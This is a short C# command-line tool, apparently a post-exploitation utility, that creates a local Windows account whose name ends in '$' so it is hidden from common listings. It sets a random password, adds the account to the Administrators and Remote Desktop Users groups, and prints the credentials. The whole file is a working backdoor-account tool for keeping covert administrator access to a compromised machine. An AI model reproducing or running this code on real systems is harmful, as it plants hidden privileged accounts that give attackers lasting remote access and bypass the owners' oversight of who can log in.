using System;
using System.DirectoryServices;

// Reference:https://docs.microsoft.com/zh-cn/troubleshoot/dotnet/csharp/add-user-local-system

namespace UserAdd
{
    class Class1
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("[!] The default is 10 bits random password");
                Console.WriteLine("Usage: UserAdd.exe <username>");
            }
            else
            {
                string user = args[0];
                string username = user + "$";
                //10位随机密码
                string chars = "!@#$%0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                Random randrom = new Random((int)DateTime.Now.Ticks);
                string password = "";
                for (int i = 0; i < 10; i++)
                {
                    password += chars[randrom.Next(chars.Length)];
                }
                try
                {
                    DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                    DirectoryEntry NewUser = AD.Children.Add(username, "user");
                    NewUser.Invoke("SetPassword", new object[] { password });
                    //NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                    NewUser.CommitChanges();
                    DirectoryEntry grp;

                    grp = AD.Children.Find("Administrators", "group");
                    if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                    grp = AD.Children.Find("Remote Desktop Users", "group");
                    if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                    Console.WriteLine("[*] Account Created Successfully");
                    Console.WriteLine($"[+] Username: {username}\n[+] Password: {password}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

            }
        }
    }
}